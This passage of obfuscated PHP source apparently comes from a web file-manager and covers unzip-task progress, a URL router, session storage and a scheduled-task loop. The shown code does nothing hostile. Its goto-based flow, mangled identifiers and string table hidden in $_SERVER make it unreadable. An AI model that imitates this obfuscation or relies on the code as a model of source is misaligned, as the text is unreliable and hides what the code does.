(is_array($càïÓñÌ„‹[$d×¸Çæ§])) { if (timeFloat() - $càïÓñÌ„‹[$d×¸Çæ§][$A×ÙÍ«Ì¸„[1601]] < $CÁíŒ’ƒ¨ó[$A×ÙÍ«Ì¸„[197]] * 0.3) { return; } $CÁíŒ’ƒ¨ó[$A×ÙÍ«Ì¸„[1602]] = $càïÓñÌ„‹[$d×¸Çæ§][$A×ÙÍ«Ì¸„[1602]]; } $càïÓñÌ„‹[$d×¸Çæ§] = $CÁíŒ’ƒ¨ó; goto AøÜôË Ëœ; cöõêéÃ: } public static function timeLimitCallLoop() { goto eª©íˆğ‡Ê; B±˜áè§¸: if (!$dò˜Ö‡ºŞ && !self::$asyncAdd) { return; } $e„¨²¤˜ê = $BÒ‡Ã®®ÁÅ[1600]; $e¤Šß†Œç¿ = Cache::get($e„¨²¤˜ê, !0); goto eè‡°”¯ğ²; eª©íˆğ‡Ê: $BÒ‡Ã®®ÁÅ =& $_SERVER[æ§›¦ÌáØ]; $a£¡ÎØİŒ¶ = array($BÒ‡Ã®®ÁÅ[1604]); $dò˜Ö‡ºŞ = in_array(strtolower(ACTION), $a£¡ÎØİŒ¶); goto B±˜áè§¸; cø‘ÛîóÚ¼: if (!$CÛĞ±„ùæ´) { return Cache::remove($e„¨²¤˜ê); } Cache::set($e„¨²¤˜ê, $CÛĞ±„ùæ´, 60); Cache::removeMemory($e„¨²¤˜ê); goto E¸‚äÔì’Œ; eè‡°”¯ğ²: if (!$e¤Šß†Œç¿ || count($e¤Šß†Œç¿) <= 0) { return; } $BØì˜­…óİ = !1; $E©¾–ïãìÆ = timeFloat(); goto aßõãÍšà; aßõãÍšà: $CÛĞ±„ùæ´ = array(); foreach ($e¤Šß†Œç¿ as $Fá’ÇÊÕö => $FŞµˆÊÇÊ‰) { if ($E©¾–ïãìÆ - $FŞµˆÊÇÊ‰[$BÒ‡Ã®®ÁÅ[1602]] > $FŞµˆÊÇÊ‰[$BÒ‡Ã®®ÁÅ[197]]) { $BØì˜­…óİ = !0; try { Hook::apply($FŞµˆÊÇÊ‰[$BÒ‡Ã®®ÁÅ[262]], $FŞµˆÊÇÊ‰[$BÒ‡Ã®®ÁÅ[1595]]); write_log($BÒ‡Ã®®ÁÅ[1605] . $Fá’ÇÊÕö . $BÒ‡Ã®®ÁÅ[68] . $FŞµˆÊÇÊ‰[$BÒ‡Ã®®ÁÅ[262]] . $BÒ‡Ã®®ÁÅ[1606] . ACTION, $BÒ‡Ã®®ÁÅ[1597]); } catch (Exception $EÊ×åºÖÅ§) { } continue; } $CÛĞ±„ùæ´[$Fá’ÇÊÕö] = $FŞµˆÊÇÊ‰; } if (!$BØì˜­…óİ) { return; } goto cø‘ÛîóÚ¼; E¸‚äÔì’Œ: } public static function finished($Fä’ç„ƒ—ø, $d×Š«çİ–©) { $A¿Ñ…§ÒÂ =& $_SERVER[æ§›¦ÌáØ]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($A¿Ñ…§ÒÂ[262] => $Fä’ç„ƒ—ø, $A¿Ñ…§ÒÂ[1595] => $d×Š«çİ–©); } private static function finishedRun() { $E¤¼„ÇÓ¬ =& $_SERVER[æ§›¦ÌáØ]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $e÷Ã£ÂöÒ¬) { try { Hook::apply($e÷Ã£ÂöÒ¬[$E¤¼„ÇÓ¬[262]], $e÷Ã£ÂöÒ¬[$E¤¼„ÇÓ¬[1595]]); } catch (Exception $C²£Ş¹ì°) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { goto D“‹¶Œğİ¦; eÖŸªµœĞ¸: Hook::bind($dÉ—˜Ñƒ©²[1079], array($this, $dÉ—˜Ñƒ©²[1609])); $dÑÁôÈä’é =& $this->task; $dÑÁôÈä’é[$dÉ—˜Ñƒ©²[1610]] = $dÉ—˜Ñƒ©²[1084]; goto b¯—Ú˜¾è; b¯—Ú˜¾è: if (!$dÑÁôÈä’é[$dÉ—˜Ñƒ©²[1423]]) { $dÑÁôÈä’é[$dÉ—˜Ñƒ©²[1423]] = LNG($dÉ—˜Ñƒ©²[1611]); } goto b‘®ß»„Ä‰; D“‹¶Œğİ¦: $dÉ—˜Ñƒ©² =& $_SERVER[æ§›¦ÌáØ]; parent::startAfter(); Hook::bind($dÉ—˜Ñƒ©²[1607], array($this, $dÉ—˜Ñƒ©²[1608])); goto eÖŸªµœĞ¸; b‘®ß»„Ä‰: } protected function endAfter() { $aÙÅ˜‰àåŠ =& $_SERVER[æ§›¦ÌáØ]; parent::endAfter(); Hook::unbind($aÙÅ˜‰àåŠ[1607], array($this, $aÙÅ˜‰àåŠ[1608])); Hook::unbind($aÙÅ˜‰àåŠ[1079], array($this, $aÙÅ˜‰àåŠ[1609])); } public function updateAfter() { $FŒŠ˜‰ÒíÜ =& $_SERVER[æ§›¦ÌáØ]; $aÃÊèÒ®å› =& $this->task; if (!$aÃÊèÒ®å›[$FŒŠ˜‰ÒíÜ[1011]] || !$aÃÊèÒ®å›[$FŒŠ˜‰ÒíÜ[716]]) { return; } if ($aÃÊèÒ®å›[$FŒŠ˜‰ÒíÜ[1610]] == $FŒŠ˜‰ÒíÜ[1084]) { $d‡‰‚±„¦œ = 0; if ($aÃÊèÒ®å›[$FŒŠ˜‰ÒíÜ[1566]]) { $d‡‰‚±„¦œ = $aÃÊèÒ®å›[$FŒŠ˜‰ÒíÜ[1567]] / $aÃÊèÒ®å›[$FŒŠ˜‰ÒíÜ[1566]]; } $aÃÊèÒ®å›[$FŒŠ˜‰ÒíÜ[1521]] = $d‡‰‚±„¦œ * 0.3; } else { if ($aÃÊèÒ®å›[$FŒŠ˜‰ÒíÜ[1610]] == $FŒŠ˜‰ÒíÜ[311]) { $d‡‰‚±„¦œ = $aÃÊèÒ®å›[$FŒŠ˜‰ÒíÜ[1026]] / $aÃÊèÒ®å›[$FŒŠ˜‰ÒíÜ[1011]]; $aÃÊèÒ®å›[$FŒŠ˜‰ÒíÜ[1521]] = 0.3 + $d‡‰‚±„¦œ * 0.4; } else { if ($aÃÊèÒ®å›[$FŒŠ˜‰ÒíÜ[1610]] == $FŒŠ˜‰ÒíÜ[107]) { $Eñ‚ø¨«½ˆ = 0; if ($aÃÊèÒ®å›[$FŒŠ˜‰ÒíÜ[1568]] == $FŒŠ˜‰ÒíÜ[107]) { $Eñ‚ø¨«½ˆ = $aÃÊèÒ®å›[$FŒŠ˜‰ÒíÜ[1567]]; } $d‡‰‚±„¦œ = ($aÃÊèÒ®å›[$FŒŠ˜‰ÒíÜ[1571]] + $Eñ‚ø¨«½ˆ) / $aÃÊèÒ®å›[$FŒŠ˜‰ÒíÜ[716]]; $aÃÊèÒ®å›[$FŒŠ˜‰ÒíÜ[1521]] = 0.3 + 0.4 + $d‡‰‚±„¦œ * 0.3; } } } if ($aÃÊèÒ®å›[$FŒŠ˜‰ÒíÜ[1521]] > 0) { $E¨ø™†åÚ¸ = timeFloat() - $aÃÊèÒ®å›[$FŒŠ˜‰ÒíÜ[742]] - $aÃÊèÒ®å›[$FŒŠ˜‰ÒíÜ[1524]]; $aÃÊèÒ®å›[$FŒŠ˜‰ÒíÜ[1525]] = $E¨ø™†åÚ¸ * (1 - $aÃÊèÒ®å›[$FŒŠ˜‰ÒíÜ[1521]]) / $aÃÊèÒ®å›[$FŒŠ˜‰ÒíÜ[1521]]; } } public function addFile($Bò‹óø±²) { goto C­ƒòØÖÈ; cÕ›÷Ş¼‚‰: $bã¶ò ŸŞ[$fŠËÌ‘À©[1013]] = $fŠËÌ‘À©[1586]; $bã¶ò ŸŞ[$fŠËÌ‘À©[1568]] = $fŠËÌ‘À©[1084]; $bã¶ò ŸŞ[$fŠËÌ‘À©[716]] = $a«ÍïŒ‡õÂ[$fŠËÌ‘À©[78]]; goto e¶Ô‰¨„¥«; d¹Âè¼ªÕ°: $bã¶ò ŸŞ[$fŠËÌ‘À©[1564]] = $a«ÍïŒ‡õÂ[$fŠËÌ‘À©[28]]; $bã¶ò ŸŞ[$fŠËÌ‘À©[1566]] = $a«ÍïŒ‡õÂ[$fŠËÌ‘À©[78]]; $bã¶ò ŸŞ[$fŠËÌ‘À©[1567]] = 0; goto cÕ›÷Ş¼‚‰; dÍáÄëèïš: $this->update(); goto BÉ˜ ·Ùæ; e¶Ô‰¨„¥«: $bã¶ò ŸŞ[$fŠËÌ‘À©[1011]] = 1; $EåÔîª = 0; $bã¶ò ŸŞ[$fŠËÌ‘À©[1575]] = array($fŠËÌ‘À©[1576] => $EåÔîª + 1, $fŠËÌ‘À©[413] => $a«ÍïŒ‡õÂ[$fŠËÌ‘À©[28]], $fŠËÌ‘À©[76] => $a«ÍïŒ‡õÂ[$fŠËÌ‘À©[76]], $fŠËÌ‘À©[500] => $a«ÍïŒ‡õÂ[$fŠËÌ‘À©[500]] ? $a«ÍïŒ‡õÂ[$fŠËÌ‘À©[500]] : $a«ÍïŒ‡õÂ[$fŠËÌ‘À©[76]]); goto dÍáÄëèïš; C­ƒòØÖÈ: $fŠËÌ‘À© =& $_SERVER[æ§›¦ÌáØ]; $bã¶ò ŸŞ =& $this->task; $a«ÍïŒ‡õÂ = IO::info($Bò‹óø±²); goto d¹Âè¼ªÕ°; BÉ˜ ·Ùæ: } public function unzipAfter($b¹òÜÅ‚´Ä) { goto a´×‹¦™‘Á; Aƒ½Ü‘íƒ™: $EíÌ’ÚêÇ[$EÛÍ¦Ğòß[1564]] = $EÛÍ¦Ğòß[33]; $EíÌ’ÚêÇ[$EÛÍ¦Ğòß[1571]] = 0; $EíÌ’ÚêÇ[$EÛÍ¦Ğòß[716]] = $dï‘ÚˆÉ•[$EÛÍ¦Ğòß[78]]; goto AÜĞ«‰—ç¤; A±ƒ©Ä¤í¿: $EíÌ’ÚêÇ[$EÛÍ¦Ğòß[1026]] = 0; $EíÌ’ÚêÇ[$EÛÍ¦Ğòß[1566]] = 0; $EíÌ’ÚêÇ[$EÛÍ¦Ğòß[1567]] = 0; goto Aƒ½Ü‘íƒ™; DìÎØã“ù¨: $dï‘ÚˆÉ• = IO::infoWithChildren($b¹òÜÅ‚´Ä); $a­Æ—âèğ¡ = 0; $EíÌ’ÚêÇ[$EÛÍ¦Ğòß[1575]] = array($EÛÍ¦Ğòß[1576] => $a­Æ—âèğ¡ + 1, $EÛÍ¦Ğòß[413] => $dï‘ÚˆÉ•[$EÛÍ¦Ğòß[28]], $EÛÍ¦Ğòß[76] => $dï‘ÚˆÉ•[$EÛÍ¦Ğòß[76]], $EÛÍ¦Ğòß[500] => $dï‘ÚˆÉ•[$EÛÍ¦Ğòß[500]] ? $dï‘ÚˆÉ•[$EÛÍ¦Ğòß[500]] : $dï‘ÚˆÉ•[$EÛÍ¦Ğòß[76]]); goto eï»Î¶‘î“; AÜĞ«‰—ç¤: $this->update(); self::log($EÛÍ¦Ğòß[1612] . json_encode(array($EíÌ’ÚêÇ, $dï‘ÚˆÉ•))); goto A˜¥¶Ó¢¢¬; a´×‹¦™‘Á: $EÛÍ¦Ğòß =& $_SERVER[æ§›¦ÌáØ]; $EíÌ’ÚêÇ =& $this->task; $EíÌ’ÚêÇ[$EÛÍ¦Ğòß[1610]] = $EÛÍ¦Ğòß[107]; goto DìÎØã“ù¨; eï»Î¶‘î“: if ($dï‘ÚˆÉ•[$EÛÍ¦Ğòß[29]] == $EÛÍ¦Ğòß[193]) { $EíÌ’ÚêÇ[$EÛÍ¦Ğòß[1011]] = 1; } else { $EíÌ’ÚêÇ[$EÛÍ¦Ğòß[1011]] = $dï‘ÚˆÉ•[$EÛÍ¦Ğòß[81]][$EÛÍ¦Ğòß[79]]; } $EíÌ’ÚêÇ[$EÛÍ¦Ğòß[1013]] = $EÛÍ¦Ğòß[33]; $EíÌ’ÚêÇ[$EÛÍ¦Ğòß[1568]] = 0; goto A±ƒ©Ä¤í¿; A˜¥¶Ó¢¢¬: } public function nameParse($CÂ¤„Àˆ‚) { goto B‰—ŠÄé¸Ş; bŸ›ƒ‚ä: $this->update(); goto AÓ³ïŞË¨É; e—š¾ä…æ: $Eé±à‚à‚Ú = get_path_this($CÂ¤„Àˆ‚); if (strstr($Eé±à‚à‚Ú, $a¨îŞ†àí„[95])) { $E Å¹ó—Ö®[$a¨îŞ†àí„[1026]] += 1; $E Å¹ó—Ö®[$a¨îŞ†àí„[1011]] += 1; } $E Å¹ó—Ö®[$a¨îŞ†àí„[1564]] = $CÂ¤„Àˆ‚; goto bŸ›ƒ‚ä; B‰—ŠÄé¸Ş: $a¨îŞ†àí„ =& $_SERVER[æ§›¦ÌáØ]; $E Å¹ó—Ö® =& $this->task; if ($E Å¹ó—Ö®[$a¨îŞ†àí„[1610]] == $a¨îŞ†àí„[1084]) { $E Å¹ó—Ö®[$a¨îŞ†àí„[1610]] = $a¨îŞ†àí„[311]; $E Å¹ó—Ö®[$a¨îŞ†àí„[1571]] = 0; $E Å¹ó—Ö®[$a¨îŞ†àí„[716]] = 0; } goto e—š¾ä…æ; AÓ³ïŞË¨É: } } goto fîËªŒİÍÖ; FÌ§Êì´—‹: class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\x3a\x61\x6e\x79" => "\133\136\57\x5d\53", "\x3a\x6e\165\x6d" => "\x5b\60\x2d\x39\135\53", "\72\x61\x6c\x6c" => "\x2e\52"); public static $errorCallback; public static function __callstatic($CŒ…–¡íƒ, $a’œ¼†ğÌ) { $f‹îÙê‚»‰ =& $_SERVER[æ§›¦ÌáØ]; if ($CŒ…–¡íƒ == $f‹îÙê‚»‰[1468]) { $aµÂºìÇÓ± = array_map($f‹îÙê‚»‰[1469], $a’œ¼†ğÌ[0]); $B†—•™‹Úø = strpos($a’œ¼†ğÌ[1], $f‹îÙê‚»‰[8]) === 0 ? $a’œ¼†ğÌ[1] : $f‹îÙê‚»‰[8] . $a’œ¼†ğÌ[1]; $dóá÷»«Œ = $a’œ¼†ğÌ[2]; } else { $aµÂºìÇÓ± = null; $B†—•™‹Úø = strpos($a’œ¼†ğÌ[0], $f‹îÙê‚»‰[8]) === 0 ? $a’œ¼†ğÌ[0] : $f‹îÙê‚»‰[8] . $a’œ¼†ğÌ[0]; $dóá÷»«Œ = $a’œ¼†ğÌ[1]; } array_push(self::$maps, $aµÂºìÇÓ±); array_push(self::$routes, $B†—•™‹Úø); array_push(self::$methods, strtoupper($CŒ…–¡íƒ)); array_push(self::$callbacks, $dóá÷»«Œ); } public static function error($Cä‰ÇÈÚÆ) { self::$errorCallback = $Cä‰ÇÈÚÆ; } public static function haltOnMatch($AÚ§êƒ = true) { self::$halts = $AÚ§êƒ; } public static function dispatch() { goto fÇÙ÷„éÄ¥; fÇÙ÷„éÄ¥: $CìÒèÈ…²â =& $_SERVER[æ§›¦ÌáØ]; $B©ğ’ææ« = parse_url($_SERVER[$CìÒèÈ…²â[1470]], PHP_URL_PATH); $dˆëƒ¶òÕË = $_SERVER[$CìÒèÈ…²â[157]]; goto aÂ‹™Û¡; Bˆ½÷‚Ÿ´‚: self::$routes = preg_replace($CìÒèÈ…²â[1154], $CìÒèÈ…²â[8], self::$routes); if (in_array($B©ğ’ææ«, self::$routes)) { $DĞÓñªß™ = array_keys(self::$routes, $B©ğ’ææ«); foreach ($DĞÓñªß™ as $a´¥¶°ô‹) { if (self::$methods[$a´¥¶°ô‹] == $dˆëƒ¶òÕË || self::$methods[$a´¥¶°ô‹] == $CìÒèÈ…²â[1471] || in_array($dˆëƒ¶òÕË, self::$maps[$a´¥¶°ô‹])) { $b“ŠÁœ…ó› = !0; if (!is_object(self::$callbacks[$a´¥¶°ô‹])) { $Bìˆ…º»ğÈ = explode($CìÒèÈ…²â[8], self::$callbacks[$a´¥¶°ô‹]); $B†ÆôÇº¼± = end($Bìˆ…º»ğÈ); $c…Â¿Öíä = explode($CìÒèÈ…²â[1472], $B†ÆôÇº¼±); $A‡ôé¶Â  = new $c…Â¿Öíä[0](); $A‡ôé¶Â ->{$c…Â¿Öíä[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$a´¥¶°ô‹]); if (self::$halts) { return; } } } } } else { $DÑƒêÈ‡­ƒ = 0; foreach (self::$routes as $a´¥¶°ô‹) { if (strpos($a´¥¶°ô‹, $CìÒèÈ…²â[4]) !== !1) { $a´¥¶°ô‹ = str_replace($d†ÌëÁø‹, $A¿ŠŒº®ä›, $a´¥¶°ô‹); } if (preg_match($CìÒèÈ…²â[1473] . $a´¥¶°ô‹ . $CìÒèÈ…²â[1474], $B©ğ’ææ«, $e²Ô¡ĞÀîà)) { if (self::$methods[$DÑƒêÈ‡­ƒ] == $dˆëƒ¶òÕË || self::$methods[$DÑƒêÈ‡­ƒ] == $CìÒèÈ…²â[1471] || !empty(self::$maps[$DÑƒêÈ‡­ƒ]) && in_array($dˆëƒ¶òÕË, self::$maps[$DÑƒêÈ‡­ƒ])) { $b“ŠÁœ…ó› = !0; array_shift($e²Ô¡ĞÀîà); if (!is_object(self::$callbacks[$DÑƒêÈ‡­ƒ])) { $Bìˆ…º»ğÈ = explode($CìÒèÈ…²â[8], self::$callbacks[$DÑƒêÈ‡­ƒ]); $B†ÆôÇº¼± = end($Bìˆ…º»ğÈ); $c…Â¿Öíä = explode($CìÒèÈ…²â[1472], $B†ÆôÇº¼±); $A‡ôé¶Â  = new $c…Â¿Öíä[0](); if (!method_exists($A‡ôé¶Â , $c…Â¿Öíä[1])) { echo $CìÒèÈ…²â[1475]; } else { call_user_func_array(array($A‡ôé¶Â , $c…Â¿Öíä[1]), $e²Ô¡ĞÀîà); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$DÑƒêÈ‡­ƒ], $e²Ô¡ĞÀîà); if (self::$halts) { return; } } } } $DÑƒêÈ‡­ƒ++; } } if ($b“ŠÁœ…ó› == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $eôÀè¦¨º =& $_SERVER[æ§›¦ÌáØ]; header($_SERVER[$eôÀè¦¨º[1476]] . $eôÀè¦¨º[1477]); echo $eôÀè¦¨º[1478]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$CìÒèÈ…²â[1470]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } goto eà‡Ç‹¼•„; aÂ‹™Û¡: $d†ÌëÁø‹ = array_keys(static::$patterns); $A¿ŠŒº®ä› = array_values(static::$patterns); $b“ŠÁœ…ó› = !1; goto Bˆ½÷‚Ÿ´‚; eà‡Ç‹¼•„: } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { goto fÖ¸ƒÆâŠ; E‡ğëé¡İ±: $C•™Éİ—÷Ì = $GLOBALS[$A–ÂŒ‘ìè[6]][$A–ÂŒ‘ìè[347]]; self::$sessionTime = $C•™Éİ—÷Ì[$A–ÂŒ‘ìè[1479]]; $b—”¸•¤Ä• = isset($GLOBALS[$A–ÂŒ‘ìè[1480]]) ? $GLOBALS[$A–ÂŒ‘ìè[1480]] : SESSION_ID; goto D‚â™ò´‘; cààù¶¼›ô: $cñºÒ—ö„‡ = $C•™Éİ—÷Ì[$CÑ“¹šÈ¸]; $Eà–ŠĞƒ‹¢ = $C•™Éİ—÷Ì[$A–ÂŒ‘ìè[794]]; switch ($CÑ“¹šÈ¸) { case $A–ÂŒ‘ìè[17]: self::$handle = Model($A–ÂŒ‘ìè[795]); break; case $A–ÂŒ‘ìè[796]: self::$handle = new CacheRedis($cñºÒ—ö„‡, $Eà–ŠĞƒ‹¢); break; case $A–ÂŒ‘ìè[797]: self::$handle = new CacheMemcached($cñºÒ—ö„‡, $Eà–ŠĞƒ‹¢); break; case $A–ÂŒ‘ìè[193]: $cñºÒ—ö„‡[$A–ÂŒ‘ìè[76]] = $cñºÒ—ö„‡[$A–ÂŒ‘ìè[76]] . $A–ÂŒ‘ìè[1482]; self::$handle = new CacheFile($cñºÒ—ö„‡, $Eà–ŠĞƒ‹¢); default: break; } goto FÄ ­ƒîšÖ; fÖ¸ƒÆâŠ: $A–ÂŒ‘ìè =& $_SERVER[æ§›¦ÌáØ]; static $e Á¼ƒÙã­ = false; if ($e Á¼ƒÙã­) { return $e Á¼ƒÙã­; } goto E‡ğëé¡İ±; FÄ ­ƒîšÖ: if (!self::$data) { CacheLock::lock(self::$sessionSign); self::$data = self::$handle->get(self::$sessionSign); CacheLock::unlock(self::$sessionSign); self::$data = unserialize(self::$data); if (!is_array(self::$data)) { self::$data = array(); } } $e Á¼ƒÙã­ = new self(); return $e Á¼ƒÙã­; goto bè¤…·ŸùÔ; D‚â™ò´‘: if (self::$sessionSign) { } else { if (Cookie::get($b—”¸•¤Ä•)) { self::$sessionSign = Cookie::get($b—”¸•¤Ä•); } else { self::$sessionSign = guid(); } } Cookie::setSafe($b—”¸•¤Ä•, self::$sessionSign, self::$sessionTime); $CÑ“¹šÈ¸ = $C•™Éİ—÷Ì[$A–ÂŒ‘ìè[1481]]; goto cààù¶¼›ô; bè¤…·ŸùÔ: } public static function sign($c¸İÅíŸÒã = false) { $c¸İÅíŸÒã && (self::$sessionSign = $c¸İÅíŸÒã); self::init(); return self::$sessionSign; } public static function set($fï¤ÈÕ©Üõ, $F¢œ’ˆ¤³Ğ = false) { self::init(); if (is_array($fï¤ÈÕ©Üõ)) { foreach ($fï¤ÈÕ©Üõ as $DÙî½©İ¯— => $bùãœøà‹¢) { array_set_value(self::$data, $DÙî½©İ¯—, $bùãœøà‹¢); } } else { array_set_value(self::$data, $fï¤ÈÕ©Üõ, $F¢œ’ˆ¤³Ğ); } CacheLock::lock(self::$sessionSign); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); CacheLock::unlock(self::$sessionSign); } public static function get($B†ß–¢Í¥— = false) { self::init(); if (!$B†ß–¢Í¥—) { return self::$data; } return array_get_value(self::$data, $B†ß–¢Í¥—); } public static function remove($eÌÏ…ÛÉõá) { self::init(); unset(self::$data[$eÌÏ…ÛÉõá]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[æ§›¦ÌáØ][799])) { self::$handle->clearTimeout(); } } } class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { goto Aäğ¡§§œå; F«Î‰Ã²¿„: while (!0) { self::cacheClear(); if (self::valueGet($E¤é¯„‘¬ˆ[703]) != $E¤é¯„‘¬ˆ[87]) { self::valueSet($E¤é¯„‘¬ˆ[1483], $E¤é¯„‘¬ˆ[191]); self::log($E¤é¯„‘¬ˆ[1487]); die; } self::valueSet($E¤é¯„‘¬ˆ[1483], $E¤é¯„‘¬ˆ[87]); self::valueSet($E¤é¯„‘¬ˆ[1484], time()); self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } goto Aö¼„§‰Ì; Aäğ¡§§œå: $E¤é¯„‘¬ˆ =& $_SERVER[æ§›¦ÌáØ]; if (self::valueGet($E¤é¯„‘¬ˆ[703]) != $E¤é¯„‘¬ˆ[87]) { return; } if (self::valueGet($E¤é¯„‘¬ˆ[1483]) == $E¤é¯„‘¬ˆ[87]) { $F¬ñœŸËòõ = self::valueGet($E¤é¯„‘¬ˆ[1484]); if (time() - $F¬ñœŸËòõ > self::AUTO_RESTART_TIME) { self::restart(); } return; } goto aÉ•—îğ; aÉ•—îğ: http_close(); self::valueSet($E¤é¯„‘¬ˆ[1483], $E¤é¯„‘¬ˆ[87]); Hook::bind($E¤é¯„‘¬ˆ[1485], $E¤é¯„‘¬ˆ[1486]); goto F«Î‰Ã²¿„; Aö¼„§‰Ì: } public static function restart() { $EÑŠ°îíÑË =& $_SERVER[æ§›¦ÌáØ]; http_close(); self::valueSet($EÑŠ°îíÑË[703], $EÑŠ°îíÑË[191]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet($EÑŠ°îíÑË[1483], $EÑŠ°îíÑË[191]); self::valueSet($EÑŠ°îíÑË[703], $EÑŠ°îíÑË[87]); } public static function shutdownEvent() { $E¨‚Åİ”Ù‹ =& $_SERVER[æ§›¦ÌáØ]; self::valueSet($E¨‚Åİ”Ù‹[1483], $E¨‚Åİ”Ù‹[191]); self::log($E¨‚Åİ”Ù‹[1488]); } public static function config($bÙÄÂÊâ¤Æ, $dãÅ™íî…š) { self::valueSet($_SERVER[æ§›¦ÌáØ][703], $bÙÄÂÊâ¤Æ); } private static function taskRunAll() { goto eƒ¥Ğ›¨ˆ; fÒåà¿œóŸ: $A’¯áìµ•¢ = count($aÅ–—Ïä¶‹); for ($A²²êÓÖÍõ = 0; $A²²êÓÖÍõ < $A’¯áìµ•¢; $A²²êÓÖÍõ++) { $C¡åÙÏö = $aÅ–—Ïä¶‹[$A²²êÓÖÍõ]; if (!$C¡åÙÏö[$f‹ÓâíÛÁ‚[393]] || $C¡åÙÏö[$f‹ÓâíÛÁ‚[1490]] != $f‹ÓâíÛÁ‚[87]) { continue; } if (!self::taskTimeCheck($C¡åÙÏö)) { continue; } self::taskRun($C¡åÙÏö); } Hook::trigger($f‹ÓâíÛÁ‚[1491]); goto a¢å«‡ä¹; a¢å«‡ä¹: self::taskQueueRun($Eï†¦´‚); goto bñî…¬³ï™; eƒ¥Ğ›¨ˆ: $f‹ÓâíÛÁ‚ =& $_SERVER[æ§›¦ÌáØ]; $Eï†¦´‚ = timeFloat(); $aÅ–—Ïä¶‹ = Model($f‹ÓâíÛÁ‚[1489])->listData(); goto fÒåà¿œóŸ; bñî…¬³ï™: } private static function taskQueueRun($f•‡ø°à°) { $cÄÂ‰áÀóç = 10; while (!0) { $a‹®‹§–Œİ = TaskQueue::run(); if ($a‹®‹§–Œİ === !1) { break; } if (timeFloat() - $f•‡ø°à° >= $cÄÂ‰áÀóç) { break; } } } private static function taskTimeCheck($C¿¬áìÛ·ä) { goto E¡·á‰Ô´Ù; E¡·á‰Ô´Ù: $AƒÚÈôá¬ =& $_SERVER[æ§›¦ÌáØ]; $eùì‹ëó´ = json_decode($C¿¬áìÛ·ä[$AƒÚÈôá¬[197]], !0); $a‹í¨ß¸Û¥ = intval($C¿¬áìÛ·ä[$AƒÚÈôá¬[1484]]); goto A™Áœå¦à‰; A™Áœå¦à‰: $B„ŞóÑ‹À¿ = strtotime($AƒÚÈôá¬[1492] . $eùì‹ëó´[$AƒÚÈôá¬[1493]] . $AƒÚÈôá¬[1494]) - strtotime($AƒÚÈôá¬[1495]); $AáÎÛ–¬·« = time() - strtotime(date($AƒÚÈôá¬[1496]) . $AƒÚÈôá¬[1497]); $cÅ¿¨æ‡æ = $AáÎÛ–¬·« >= $B„ŞóÑ‹À¿ && $AáÎÛ–¬·« <= $B„ŞóÑ‹À¿ + 3600; goto bÖ‚·Ò¨„Î; bÖ‚·Ò¨„Î: switch ($eùì‹ëó´[$AƒÚÈôá¬[29]]) { case $AƒÚÈôá¬[1498]: if (time() - $a‹í¨ß¸Û¥ < 3600 * 24 * 30) { return !1; } if ($eùì‹ëó´[$AƒÚÈôá¬[1498]] == date($AƒÚÈôá¬[1499]) && $cÅ¿¨æ‡æ) { return !0; } break; case $AƒÚÈôá¬[1500]: if (time() - $a‹í¨ß¸Û¥ < 3600 * 24 * 7) { return !1; } $DÑõËÚê– = date($AƒÚÈôá¬[1501]) == 0 ? 7 : date($AƒÚÈôá¬[1501]); if ($eùì‹ëó´[$AƒÚÈôá¬[1500]] == $DÑõËÚê– && $cÅ¿¨æ‡æ) { return !0; } break; case $AƒÚÈôá¬[1493]: if (time() - $a‹í¨ß¸Û¥ < 3600 * 24) { return !1; } if ($cÅ¿¨æ‡æ) { return !0; } break; case $AƒÚÈôá¬[1502]: if (time() - $a‹í¨ß¸Û¥ >= floatval($eùì‹ëó´[$AƒÚÈôá¬[1502]]) * 60) { return !0; } break; default: break; } return !1; goto Dî©Ğ–ƒÌâ; Dî©Ğ–ƒÌâ: } private static function closeDatabase() { goto E£‰­ĞÏ¥¹; A…¢°•¤®µ: if (!$Dè¤°•°‰) { $Dè¤°•°‰ = time(); } if (time() - $Dè¤°•°‰ < $B®›”’÷ƒ) { return; } $Dè¤°•°‰ = time(); goto e¹‹Û¡Ìå; e¹‹Û¡Ìå: $c§·œİÓë‘ = Model($f›½ßÄÃ³[494])->db($f›½ßÄÃ³[33]); if ($c§·œİÓë‘) { $c§·œİÓë‘->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { write_log($f›½ßÄÃ³[1503], $f›½ßÄÃ³[1504]); die; } goto fš£ô¡­«; E£‰­ĞÏ¥¹: $f›½ßÄÃ³ =& $_SERVER[æ§›¦ÌáØ]; static $Dè¤°•°‰ = 0; $B®›”’÷ƒ = 300; goto A…¢°•¤®µ; fš£ô¡­«: } public static function taskRun($d£øˆÛïéŒ) { goto aØŞÄ«ïª‹; Dæöà¼‰„Ã: return !0; goto c£ä¯êíÉ; aØŞÄ«ïª‹: $AˆÜñèáç =& $_SERVER[æ§›¦ÌáØ]; self::log($AˆÜñèáç[1505] . $d£øˆÛïéŒ[$AˆÜñèáç[393]] . $AˆÜñèáç[1506] . $d£øˆÛïéŒ[$AˆÜñèáç[28]] . $AˆÜñèáç[1507] . $d£øˆÛïéŒ[$AˆÜñèáç[1508]]); Model($AˆÜñèáç[1489])->run($d£øˆÛïéŒ[$AˆÜñèáç[393]]); goto CÌØ‰¾¹¸®; CÌØ‰¾¹¸®: $D©ÉÈ°‚ù° = timeFloat(); $BğÂª„Şßô = $AˆÜñèáç[33]; switch 